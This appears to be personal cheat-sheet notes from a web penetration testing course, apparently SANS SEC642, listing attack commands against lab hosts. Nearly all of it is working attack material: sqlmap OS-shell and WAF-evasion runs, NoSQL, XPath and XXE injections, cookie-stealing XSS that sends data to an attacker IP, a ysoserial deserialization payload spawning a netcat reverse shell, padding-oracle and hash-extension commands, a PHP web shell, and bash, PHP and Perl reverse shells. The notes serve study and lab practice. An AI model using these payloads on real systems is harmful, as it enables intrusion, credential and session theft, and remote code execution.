PHP source code:

http://typejuggler.sec642.org/docs/index.php?page=php://filter/read=convert.base64-encode/resource=index.php

Consider deletion .php depending on how pages are represent

Auth bypass with NULL condition (642 book 2 p 72): user=127.0.0.1&pass[]=Test
--------------------------------------------------------------
sqlmap -l /tmp/burp.log

sqlmap -u "http://dojo-basic.sec642.org/index.php?page=login.php" --data="user_name=dsf&password=sdf&Submit_button=Submit" --os-shell

sqlmap -u "http://modsec.sec642.org/index.php" --data="sqli=test" --proxy="http://localhost:8080" --tamper modsec --user-agent=mozilla --dbs --dbms mysql

ruby sqli - https://rails-sqli.org/
---------------------------------------------------

NoSQL inj (642 p 114 and p 121)

http://mongo.sec642.org/guess_the_key.php?guess='; return key ; //

http://mongo.sec642.org/guess_the_key.php?guess=' ; return key; var a = 'a

http://mongo.sec642.org/user_lookup.php?type[$ne]=user&username[$ne]=foo

/login.php?type[$ne]=user&username[$ne]=sdf&password=sdg' || '1'=='1 HTTP/1.1
/login.php?type[$regex]=.*&username[$regex]=.*
/login.php?type=user&username[$ne]=foo

In Burp Repeater URL encoding of above required

--------------------------------------------------
XPath injection

' or '1'='1
Also try any of symbols below:
'	"	//	.
----------------------------------------------------
XSS - call it script injection

</stYle/</titLe/</teXtarEa/<scRipt/--!>

<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"><script>alert(42)</script></svg>

<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoNDIpPC9zY3JpcHQ+PC9zdmc+"></EMBED>

<embed src="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCg0Mik7PC9zY3JpcHQ+"></embed>

http://dojo-basic.sec642.org/index.php?page=browser-info.php#bla=%3Cscript%3Ealert%28123%29%3C/script%3E

<script>document.location='http://10.42.51.166/cookiecatcher.php?'+document.cookie</script>

<script>document.location='http://10.42.51.166:3001/asdasd.php?'+document.cookie</script>

HTTP response splitting (make server create new cookie):
curl -I "http://fooexample.com/en/%0d%0aset-cookie:test=test"
---------------------------------------

XSRF

dojo-basic.sec642.org/index.php?page=browser-info.php&bla=<script src="http://10.42.51.166/grab.js"></script>
-------------------------------------------

STRUTS 1: .do
STRUTS 2: .action
nmap -sT -sV struts.sec642.org -p 8080 --script=http-vuln-cve2017-5638 --script-args path=/showcase/
python serializekiller.py --url jenkins.sec642.org
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 "sh -c '$@|sh' . nc 10.42.51.166 1337 -e /bin/bash" > jenkins.payload
python jenkins.py jenkins.sec642.org 8080 jenkins.payload
-------------------------------------------

Express JS injections

ls folders:
res.end(require('fs').readdirSync('/usr').toString())
type file:
res.end(require('fs').readFileSync('/etc/passwd').toString())

-----------------------------------------------
Flash decompilation:

wget http://website.com/snake.swf
flare snake.swf
grep -C 1 scorehash snake.flr (book 4 p 68)

Java decompiler: Procyon
-----------------------------------------------
SOAP
Check WSDL parser in Burp or SoapUI to build a request from the wsdl description (book4 p 87)

-----------------------------------------------
XXE
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY c SYSTEM "file:///etc/passwd">
]>
<order>
        <item>
                <name>&c;</name>
        </item>
</order>
---------------------------------------
HTTP2 - need to url encode injections

nghttp -v -u http://http2.sec642.org/../../../../etc/passwd doesn't work, need to be encoded
curl2 --http2 http://http2.sec642.org/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
curl --http2-prior-knowledge --data "status=on" http://localhost:8080/index.ph
p

---------------------------------------------------

wappalyzer - identifies waf

Specify firefox user agent:
curl --user-agent firefox -H "Content-Type: text/html" -H "Content-Length: 777" http://modsec.sec642.org -v

proxyCannon for external tests to change your external IP via EC2

----------------------------------------------------
GZIP header: 1f 8b

Pyhton library for encryption (p 50): from passlib.hash import ...

XORing files: python xor2files.py 123456.txt 123456.txt.enc 123456.xored

Burp Intruder: ECB block shuffler and CBC bit flipper

32 ASCII chars = 16 bytes = 8 for IV and 8 encrypted block
8 bytes block DES or 3DES

Padding Oracle:
padBuster http://evilcaptcha.sec642.org/captcha.php?enc=4f364a444b4a6a42bb65fa8573b5bcf2 4f364a444b4a6a42bb65fa8573b5bcf2 8 -encoding 1
padBuster http://evilbank.sec642.org/captcha.php?enc=33742e6c75506166d620863ef0a73e7923c5b21310e01b65 33742e6c75506166d620863ef0a73e7923c5b21310e01b65 8 -encoding 1 -plaintext f2bkx87Rh

echo -n test | sha1sum

If input is hashed with secret and checked locally to retrieve resource, hash extention possible (except SHA 3)
./hash_extender --out-data-format=html -s 7d87faa3c77d2d260e31a7f7dfb7a387 -a '&username=administrator&' -f md5 -l 12 -d 'username=guest&date=2018-11-29T17:22:40+0000&secret_length=12&'

./hash_extender -f sha1 --data 'test' -s dd03bd22af3a4a0253a66621bcb80631556b100e --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > strings.out

---------------------------------------------------

swagger - enumerates and documents API calls by reading the source code
mallory - TCP/ UDP proxy
burp extention NO http Proxy - potentially TCP proxy

Shells

<?php system($_GET['cmd']); ?>
php -r '$sock=fsockopen("10.42.51.166",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php $sock=fsockopen("10.42.51.166",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>

/bin/bash -i >& /dev/tcp/10.42.51.166/1337 0>&1

perl -e 'use Socket;$i="10.42.51.166";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-------------------------------------------

cat /etc/lsb-release - container

